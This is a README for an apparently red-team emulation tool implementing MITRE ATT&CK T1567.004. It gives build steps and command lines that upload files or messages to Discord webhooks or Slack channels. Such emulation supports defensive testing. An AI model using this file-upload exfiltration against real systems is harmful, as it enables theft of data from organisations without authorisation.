# T1567.004 - Exfiltration Over Web Service: Exfiltration Over Webhook

Implementation of [T1567.004](https://attack.mitre.org/techniques/T1567/004/) - Exfiltration Over Web Service: Exfiltration Over Webhook.

## Features

- Supports Discord webhooks for message and file uploads
- Supports Slack bot integration for message and file uploads

## Usage

1. Build the binary:

    ```sh
    # For native platform
    make build

    # For Windows cross-compilation
    make windows
    ```

2. Run the tool:

    ```sh
    # Send a message
    ./t1567-004 -m "Test message" -w discord

    # Upload a file
    ./t1567-004 -f /path/to/file -w slack

    # Upload a file with a message
    ./t1567-004 -f /path/to/file -m "File description" -w discord
    ```

## Configuration

Before using the tool, update the following constants in `src/main.rs`:

- `DISCORD_WEBHOOK_URL`: Your Discord webhook URL
- `SLACK_BOT_TOKEN`: Your Slack bot user OAuth token
- `SLACK_CHANNEL_ID`: The target Slack channel ID

## Cleanup

Remove build artifacts:

```sh
make clean
```
